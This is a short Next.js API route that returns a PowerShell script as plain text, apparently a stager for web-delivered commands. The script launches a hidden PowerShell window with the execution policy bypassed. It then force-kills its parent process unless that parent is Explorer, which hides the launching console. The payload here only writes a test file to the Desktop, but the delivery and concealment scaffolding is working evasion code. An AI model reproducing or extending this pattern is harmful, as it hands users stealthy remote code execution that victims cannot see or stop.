import { NextRequest, NextResponse } from 'next/server';

export async function GET(req: NextRequest) {
    const script = `
    $script = {
        Start-Sleep -Seconds 5
        Add-Content -Path ([Environment]::GetFolderPath('Desktop')+'/a.txt') -Value test
        Read-Host
    }
    Start-Process powershell -WindowStyle Hidden -ArgumentList @("-WindowStyle", "Hidden", "-noexit", "-ExecutionPolicy", "Bypass", $script.ToString());
    $proc = [System.Diagnostics.Process]::GetCurrentProcess()
    $parent = Get-Process -Id (gwmi win32_process | ? processid -eq  $proc.Id).parentprocessid
    if($parent.ProcessName -ne "explorer"){Stop-Process -InputObject $parent -Force};
    Exit
    `
  return new NextResponse(script, {
    status: 200,
    headers: { 'Content-Type': 'text/plain' }
  });
}